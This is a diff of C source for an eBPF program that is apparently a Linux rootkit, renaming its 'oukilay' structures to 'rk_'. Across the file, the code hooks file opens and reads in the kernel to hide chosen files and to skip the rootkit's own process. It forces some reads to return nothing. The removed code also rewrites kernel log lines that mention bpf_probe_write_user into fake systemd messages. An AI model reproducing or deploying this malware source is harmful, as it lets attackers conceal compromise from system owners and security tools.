@@ -6,92 +6,7 @@
 #include "include/bpf.h"
 #include "include/bpf_helpers.h"
 
-/*
-    - we should use the dentry resolver to avoid bypass
-    - handle do_syslog
-    - possibly redirect syscall number open to unlink
-    - possible to use named pipe to block open
-*/
-
-#define MAX_SEGMENT_LENGTH 32
-
-enum
-{
-    KMSG_ACTION = 1,
-    KPROBE_EVENTS_ACTION
-};
-
-struct bpf_map_def SEC("maps/read_ret_progs") read_ret_progs = {
-    .type = BPF_MAP_TYPE_PROG_ARRAY,
-    .key_size = sizeof(u32),
-    .value_size = sizeof(u32),
-    .max_entries = 10,
-};
-
-struct oukilay_file_t
-{
-    int fd;
-    int action;
-
-    void *read_buf;
-    int read_size;
-};
-
-struct bpf_map_def SEC("maps/oukilay_files") oukilay_files = {
-    .type = BPF_MAP_TYPE_LRU_HASH,
-    .key_size = sizeof(u64),
-    .value_size = sizeof(struct oukilay_file_t),
-    .max_entries = 128,
-    .pinning = 0,
-    .namespace = "",
-};
-
-struct oukilay_path_key_t
-{
-    u64 hash;
-    u64 pos;
-};
-
-struct oukilay_path_action_t
-{
-    u64 fs_hash;
-    u64 action;
-};
-
-struct bpf_map_def SEC("maps/oukilay_path_keys") oukilay_path_keys = {
-    .type = BPF_MAP_TYPE_HASH,
-    .key_size = sizeof(struct oukilay_path_key_t),
-    .value_size = sizeof(struct oukilay_path_action_t),
-    .max_entries = 128,
-    .pinning = 0,
-    .namespace = "",
-};
-
-// Fowler/Noll/Vo hash
-#define FNV_BASIS ((__u64)14695981039346656037U)
-#define FNV_PRIME ((__u64)1099511628211U)
-
-#define __update_hash(key, data) \
-    *key ^= (__u64)(data);       \
-    *key *= FNV_PRIME;
-
-void __attribute__((always_inline)) update_hash_byte(__u64 *key, __u8 byte)
-{
-    __update_hash(key, byte);
-}
-
-void __attribute__((always_inline)) update_hash_str(__u64 *hash, const char *str)
-{
-#pragma unroll
-    for (int i = 0; i != MAX_SEGMENT_LENGTH; i++)
-    {
-        if (str[i] == '\0')
-        {
-            break;
-        }
-        update_hash_byte(hash, str[i]);
-    }
-}
+#include "common.h"
 
 static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
 {
@@ -116,7 +31,7 @@ static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
     return hash;
 }
 
-static __attribute__((always_inline)) u64 get_file_action(struct dentry *dentry)
+static __attribute__((always_inline)) u64 get_file_attr(struct dentry *dentry)
 {
     struct qstr qstr;
     struct dentry *d_parent;
@@ -124,7 +39,7 @@ static __attribute__((always_inline)) u64 get_file_action(struct dentry *dentry)
     char name[MAX_SEGMENT_LENGTH + 1];
     int end = 0;
 
-    struct oukilay_path_key_t key = {};
+    struct rk_path_key_t key = {};
 
 #pragma unroll
     for (int i = 0; i < 15; i++)
@@ -151,7 +66,7 @@ static __attribute__((always_inline)) u64 get_file_action(struct dentry *dentry)
 
         update_hash_str(&key.hash, name);
 
-        struct oukilay_path_action_t *action = bpf_map_lookup_elem(&oukilay_path_keys, &key);
+        struct rk_path_attr_t *action = bpf_map_lookup_elem(&rk_path_keys, &key);
         if (!action)
         {
             return 0;
@@ -176,21 +91,30 @@ static __attribute__((always_inline)) u64 get_file_action(struct dentry *dentry)
 SEC("kprobe/vfs_open")
 int _vfs_open(struct pt_regs *ctx)
 {
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+
+    u64 pid;
+    LOAD_CONSTANT("rk_pid", pid);
+
+    if (pid == pid_tgid >> 32)
+    {
+        return 0;
+    }
+
     struct path *path = (struct path *)PT_REGS_PARM1(ctx);
 
     struct dentry *dentry;
     bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);
 
-    u64 action = get_file_action(dentry);
+    u64 action = get_file_attr(dentry);
     if (!action)
     {
         return 0;
     }
 
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t value = {
+    struct rk_file_t file = {
         .action = action};
-    bpf_map_update_elem(&oukilay_files, &key, &value, BPF_ANY);
+    bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);
 
     return 0;
 }
@@ -198,14 +122,23 @@ int _vfs_open(struct pt_regs *ctx)
 SEC("kretprobe/__x64_sys_openat")
 int __x64_sys_openat_ret(struct pt_regs *ctx)
 {
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
-    if (!value)
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
+    if (!file)
     {
         return 0;
     }
 
-    value->fd = (int)PT_REGS_RC(ctx);
+    struct rk_fd_key_t fd_key =
+        {
+            .fd = (u64)PT_REGS_RC(ctx),
+            .pid = pid_tgid >> 32,
+        };
+
+    struct rk_fd_attr_t fd_attr = {
+        .action = file->action,
+    };
+    bpf_map_update_elem(&rk_fd_attrs, &fd_key, &fd_attr, BPF_ANY);
 
     return 0;
 }
@@ -213,148 +146,39 @@ int __x64_sys_openat_ret(struct pt_regs *ctx)
 SEC("kprobe/__x64_sys_read")
 int kprobe_sys_read(struct pt_regs *ctx)
 {
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
-    if (!value)
-    {
-        return 0;
-    }
-
-    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
 
     int fd;
-    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));
+    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(rctx));
 
-    if (value->fd == fd)
-    {
-        void *buf = NULL;
-        bpf_probe_read(&buf, sizeof(buf), &PT_REGS_PARM2(ctx));
-
-        value->read_buf = buf;
-    }
-
-    return 0;
-}
-
-SEC("kprobe/fill_with_zero")
-int fill_with_zero(struct pt_regs *ctx)
-{
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
-    if (!value)
-    {
-        return 0;
-    }
-
-    const char c = '\0';
-
-#pragma unroll
-    for (int i = 0; i != 256; i++)
-    {
-        if (i == value->read_size - 1)
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_fd_key_t fd_key =
         {
-            break;
-        }
-        bpf_probe_write_user(value->read_buf + i, &c, 1);
-    }
+            .fd = fd,
+            .pid = pid_tgid >> 32,
+        };
 
-    return 0;
-}
-
-SEC("kprobe/kmsg")
-int kmsg(struct pt_regs *ctx)
-{
-    int retval = PT_REGS_RC(ctx);
-
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
-    if (!value)
+    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
+    if (!fd_attr)
     {
         return 0;
     }
 
-    if (!value->read_buf)
+    if (fd_attr->action == OVERRIDE_RETURN_0_ACTION)
     {
-        return 0;
+        bpf_override_return(ctx, 0);
     }
 
-    char buf[128];
-    bpf_probe_read(buf, sizeof(buf), value->read_buf);
+    void *buf = NULL;
+    bpf_probe_read(&buf, sizeof(buf), &PT_REGS_PARM2(rctx));
 
-    u8 o1 = 0;
-    u64 hash = 0;
+    fd_attr->read_buf = buf;
 
-#pragma unroll
-    for (int i = 0; i != 128; i++)
-    {
-        if (buf[i] == ';' && !o1)
-        {
-            hash = FNV_BASIS;
-            o1 = i + 1;
-            continue;
-        }
-        else if (buf[i] == ' ')
-        {
-            hash = FNV_BASIS;
-            continue;
-        }
-        update_hash_byte(&hash, buf[i]);
-
-        // `bpf_probe_write_user` hash or `bpf_get_probe_write_proto`
-        if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
-        {
-            break;
-        }
-    }
-
-    if (hash == 0xada8e5f3e94cf1f8)
-    {
-        const char override[] = "systemd[1]: Reached target Sockets.";
-        bpf_probe_write_user(value->read_buf + o1, override, sizeof(override) - 1);
-
-        value->read_buf += o1 + sizeof(override) - 1;
-        value->read_size = retval - (o1 + sizeof(override) - 1);
-
-        bpf_tail_call(ctx, &read_ret_progs, 3);
-    }
-
-    if (hash == 0x55c7edee212d1ef4)
-    {
-        const char override[] = "systemd[1]: Reached target Paths.";
-        bpf_probe_write_user(value->read_buf + o1, override, sizeof(override) - 1);
-
-        value->read_buf += o1 + sizeof(override) - 1;
-        value->read_size = retval - (o1 + sizeof(override) - 1);
-
-        bpf_tail_call(ctx, &read_ret_progs, 3);
-    }
-
-    return 0;
-}
-
-SEC("kprobe/kprobe_events")
-int kprobe_events(struct pt_regs *ctx)
-{
-    int retval = PT_REGS_RC(ctx);
-    if (!retval)
-    {
-        return 0;
-    }
-
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
-    if (!value)
-    {
-        return 0;
-    }
-
-    if (!value->read_buf)
-    {
-        return 0;
-    }
-
-    char buf[128];
-    bpf_probe_read(buf, sizeof(buf), value->read_buf);
+    struct rk_file_t file = {
+        .fd = fd,
+        .action = fd_attr->action,
+    };
+    bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);
 
     return 0;
 }
@@ -362,14 +186,14 @@ int kprobe_events(struct pt_regs *ctx)
 SEC("kretprobe/__x64_sys_read")
 int __x64_sys_read_ret(struct pt_regs *ctx)
 {
-    u64 key = bpf_get_current_pid_tgid();
-    struct oukilay_file_t *value = (struct oukilay_file_t *)bpf_map_lookup_elem(&oukilay_files, &key);
-    if (!value)
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
+    if (!file)
     {
         return 0;
     }
 
-    bpf_tail_call(ctx, &read_ret_progs, value->action);
+    bpf_tail_call(ctx, &read_ret_progs, file->action);
 
     return 0;
 }
